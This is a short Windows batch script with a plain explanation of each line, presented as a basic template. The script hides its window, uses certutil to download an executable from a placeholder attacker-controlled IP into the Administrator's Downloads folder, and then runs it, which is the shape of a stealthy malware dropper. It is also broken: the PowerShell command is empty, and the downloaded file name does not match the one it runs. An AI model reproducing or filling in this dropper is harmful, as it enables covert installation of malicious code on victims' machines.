# Basic CMD script for windows 7

@echo off
powershell -WindowStyle Hidden -Command 
certutil -urlcache -split -f http://<Your IP address>/<Yourname File>.exe C:\Users\Administrator\Downloads\Yourname File.exe
start "" "C:\Users\Administrator\Downloads\test.exe"

@echo off

This command disables the command echoing. It prevents the commands from being shown on the command prompt window when the script runs.

powershell -WindowStyle Hidden -Command

This launches PowerShell in hidden window mode (so the user doesn’t see a new window pop up).

However, in your script, the command part after -Command is missing or on a new line, so it might not work correctly unless you put the full PowerShell command on the same line.

certutil -urlcache -split -f http://<Your IP address>/<yourname file>.exe C:\Users\Administrator\Downloads\<yourname file>.exe

This command downloads a file from the internet using certutil (a built-in Windows tool).

-urlcache -split -f: These options help download the file and split it if needed.

It saves the file to:
C:\Users\Administrator\Downloads\<yourname file>.exe

start "" "C:\Users\Administrator\Downloads\test.exe"

This starts (runs) a file named test.exe from the Downloads folder.
